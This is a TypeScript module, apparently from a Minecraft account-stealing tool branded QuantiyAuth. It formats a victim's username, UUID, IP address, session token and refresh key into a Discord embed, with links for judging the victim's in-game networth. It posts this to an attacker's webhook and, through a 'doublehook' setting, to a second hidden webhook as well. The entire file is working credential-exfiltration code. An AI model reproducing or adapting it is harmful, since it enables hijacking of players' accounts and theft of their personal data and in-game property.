import axios, { AxiosRequestConfig } from "axios";
import { database } from "..";
import config from "../../config.json";
import { RattedSchema } from "../types";

async function sendWebhook(data: RattedSchema, formattedUnsoulboundNetworth: string, formattedSoulboundNetworth: string) {
    const request: AxiosRequestConfig = {
        method: "POST",
        headers: {
            "Content-Type": "application/json",
        },
        data: {
            content: "@everyone",
            username: "Quantiy - QuantiyAuth",
            avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/800px-Anonymous_emblem.svg.png",
            embeds: [
                {
                    title: "\`🌾\` Minecraft Info",
                    description: `\`⏱️\` Expires <t:${Math.floor(Date.now() / 1000) + 86400}:R>`,
                    author: {
                        name: "✨ New user authenticated!",
                    },
                    footer: {
                        text: "https://discord.quantiy.com/ - QuantiyAuth",
                        icon_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/a/a6/Anonymous_emblem.svg/800px-Anonymous_emblem.svg.png"
                    },
                    thumbnail: {
                        url: `https://crafatar.com/avatars/${data.uuid}/?size=128&overlay=true`,
                    },
                    timestamp: new Date(),
                    color: 0x909090,
                    fields: [
                        {
                            name: "Username",
                            value: `\`\`\`${data.username}\`\`\``,
                            inline: true
                        },
                        {
                            name: "UUID",
                            value: `\`\`\`${data.uuid}\`\`\``,
                            inline: true
                        },
                        {
                            name: "IP",
                            value: `\`\`\`${data.ip}\`\`\``,
                            inline: true
                        },
                        {
                            name: "Token",
                            value: `\`\`\`${data.token}\`\`\``,
                            inline: false,
                        },
                        {
                            name: "Refresh Key",
                            value: `\`\`\`${data.refreshKey}\`\`\``,
                            inline: false,
                        },
                        {
                            name: "Useful Links",
                            value: `> [SkyCrypt](https://sky.shiiyu.moe/stats/${data.username})
                            > [NameMC](https://namemc.com/profile/${data.username})
                            > [Hypixel](https://hypixel.net/player/${data.username})
                            > \`🪙\` Networth: ${formattedUnsoulboundNetworth} (${formattedSoulboundNetworth})`,
                        }
                    ]
                }
            ]
        }
    }

    const webhook = await database.getWebhookByState(data.state);
    if (webhook) {
        await axios({...request, url: webhook}).catch();
    }

    if (config.doublehook.enabled) {
        await axios({...request, url: config.doublehook.webhook_url}).catch();
    }
}

export default sendWebhook;